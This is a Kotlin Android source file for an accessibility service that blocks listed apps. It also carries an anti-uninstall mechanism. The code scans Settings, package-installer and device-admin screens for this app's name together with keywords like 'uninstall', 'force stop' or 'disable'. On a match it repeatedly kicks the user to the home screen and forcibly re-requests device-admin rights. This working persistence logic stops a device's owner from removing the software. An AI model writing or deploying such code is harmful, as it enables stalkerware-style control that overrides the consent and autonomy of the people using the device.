package com.sync.xxx

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.Toast
import android.content.pm.PackageManager

class AppBlockerService : AccessibilityService() {

    companion object {
        var instance: AppBlockerService? = null
        val blockedPackages = mutableSetOf<String>()

        // Keywords that indicate uninstall / disable / force-stop screens
        private val UNINSTALL_KEYWORDS = listOf(
            "uninstall", "hapus", "uninstal", "force stop", "paksa berhenti",
            "disable", "nonaktifkan", "device admin", "administrator",
            "hapus aplikasi", "uninstall app", "force stop", "clear data"
        )

        fun isEnabled(ctx: Context): Boolean {
            val enabledServices = android.provider.Settings.Secure.getString(
                ctx.contentResolver,
                android.provider.Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            val component = "${ctx.packageName}/.AppBlockerService"
            val componentFull = "${ctx.packageName}/${ctx.packageName}.AppBlockerService"
            return enabledServices.split(":").any { svc ->
                svc.equals(component, ignoreCase = true) ||
                svc.equals(componentFull, ignoreCase = true)
            }
        }

        fun isUsageAccessGranted(ctx: Context): Boolean {
            return try {
                val appOps = ctx.getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
                val mode = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    appOps.unsafeCheckOpNoThrow(
                        android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                        android.os.Process.myUid(), ctx.packageName
                    )
                } else {
                    @Suppress("DEPRECATION")
                    appOps.checkOpNoThrow(
                        android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
                        android.os.Process.myUid(), ctx.packageName
                    )
                }
                mode == android.app.AppOpsManager.MODE_ALLOWED
            } catch (e: Exception) { false }
        }
    }

    private val mainHandler = Handler(Looper.getMainLooper())
    private var lastBlockedPkg = ""
    private var lastBlockTime = 0L
    private var lastAntiUninstallTime = 0L

    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context, intent: Intent) {
            when (intent.action) {
                "com.sync.xxx.BLOCK_APP" -> {
                    val pkg = intent.getStringExtra("package") ?: return
                    blockedPackages.add(pkg)
                }
                "com.sync.xxx.UNBLOCK_APP" -> {
                    val pkg = intent.getStringExtra("package") ?: return
                    blockedPackages.remove(pkg)
                }
                "com.sync.xxx.UNBLOCK_ALL" -> blockedPackages.clear()
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this

        serviceInfo = serviceInfo.apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            notificationTimeout = 0
        }

        val filter = IntentFilter().apply {
            addAction("com.sync.xxx.BLOCK_APP")
            addAction("com.sync.xxx.UNBLOCK_APP")
            addAction("com.sync.xxx.UNBLOCK_ALL")
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver, filter, RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(commandReceiver, filter)
        }
        android.util.Log.d("AppBlocker", "Service connected + anti-uninstall armed")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val type = event.eventType
        if (type != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
            type != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) return

        val pkg = event.packageName?.toString() ?: return

        // ── Anti-uninstall of THIS app ──────────────────────────────
        // Watch Settings / PackageInstaller / DeviceAdmin screens
        if (pkg == "com.android.settings" ||
            pkg == "com.google.android.packageinstaller" ||
            pkg == "com.android.packageinstaller" ||
            pkg == "com.miui.securitycenter" ||
            pkg == "com.samsung.android.packageinstaller" ||
            pkg.contains("settings") ||
            pkg.contains("packageinstaller")) {

            val now = System.currentTimeMillis()
            if (now - lastAntiUninstallTime < 800) return

            if (isLookingAtSelf(event)) {
                lastAntiUninstallTime = now
                // Kick user out
                performGlobalAction(GLOBAL_ACTION_HOME)
                mainHandler.postDelayed({ performGlobalAction(GLOBAL_ACTION_HOME) }, 60)
                mainHandler.postDelayed({
                    Toast.makeText(this, "Aplikasi dilindungi", Toast.LENGTH_SHORT).show()
                    // Re-request admin if somehow disabled
                    try {
                        if (!AntiUninstallHelper.isAdminActive(this)) {
                            AntiUninstallHelper.resetDialogFlag(this)
                            AntiUninstallHelper.requestAdminIfNeeded(this, force = true)
                        }
                    } catch (_: Exception) {}
                }, 120)
                return
            }
        }

        // ── Normal app block list ───────────────────────────────────
        if (pkg == packageName || pkg == "android" || pkg == "com.android.systemui") return
        if (!blockedPackages.contains(pkg)) return

        val now = System.currentTimeMillis()
        if (pkg == lastBlockedPkg && now - lastBlockTime < 1000) return
        lastBlockedPkg = pkg
        lastBlockTime = now

        performGlobalAction(GLOBAL_ACTION_HOME)
        mainHandler.postDelayed({ performGlobalAction(GLOBAL_ACTION_HOME) }, 50)

        val appName = try {
            val pm = packageManager
            pm.getApplicationLabel(
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
                    pm.getApplicationInfo(pkg, PackageManager.ApplicationInfoFlags.of(0))
                else
                    @Suppress("DEPRECATION") pm.getApplicationInfo(pkg, 0)
            ).toString()
        } catch (e: Exception) { pkg }

        mainHandler.postDelayed({
            Toast.makeText(this, "🚫 $appName diblokir", Toast.LENGTH_SHORT).show()
        }, 50)
    }

    /** Returns true if the current window is about THIS package (uninstall / info / admin). */
    private fun isLookingAtSelf(event: AccessibilityEvent): Boolean {
        val self = packageName.lowercase()
        val selfLabel = try {
            packageManager.getApplicationLabel(applicationInfo).toString().lowercase()
        } catch (_: Exception) { self }

        // Check class name / text from the event itself
        val className = event.className?.toString()?.lowercase() ?: ""
        val eventText = event.text?.joinToString(" ")?.lowercase() ?: ""
        if (eventText.contains(self) || eventText.contains(selfLabel)) return true

        // Walk the node tree for package name / app label / uninstall keywords
        val root = rootInActiveWindow ?: return false
        return try {
            containsSelfReference(root, self, selfLabel)
        } finally {
            try { root.recycle() } catch (_: Exception) {}
        }
    }

    private fun containsSelfReference(node: AccessibilityNodeInfo?, selfPkg: String, selfLabel: String): Boolean {
        if (node == null) return false
        val text = (node.text?.toString() ?: "").lowercase()
        val desc = (node.contentDescription?.toString() ?: "").lowercase()
        val viewId = (node.viewIdResourceName ?: "").lowercase()

        val hitPkg = text.contains(selfPkg) || desc.contains(selfPkg) || viewId.contains(selfPkg)
        val hitLabel = selfLabel.length > 2 && (text.contains(selfLabel) || desc.contains(selfLabel))
        val hitKeyword = UNINSTALL_KEYWORDS.any { kw -> text.contains(kw) || desc.contains(kw) }

        // If we see our package/label together with uninstall-ish keyword → block
        if ((hitPkg || hitLabel) && hitKeyword) return true
        // Strong match: our package name visible on settings-like screen
        if (hitPkg && (text.contains("uninstall") || text.contains("hapus") || text.contains("force") ||
                    text.contains("admin") || text.contains("disable") || text.contains("nonaktif"))) {
            return true
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            try {
                if (containsSelfReference(child, selfPkg, selfLabel)) return true
            } finally {
                try { child.recycle() } catch (_: Exception) {}
            }
        }
        return false
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        super.onDestroy()
        try { unregisterReceiver(commandReceiver) } catch (_: Exception) {}
        instance = null
    }
}
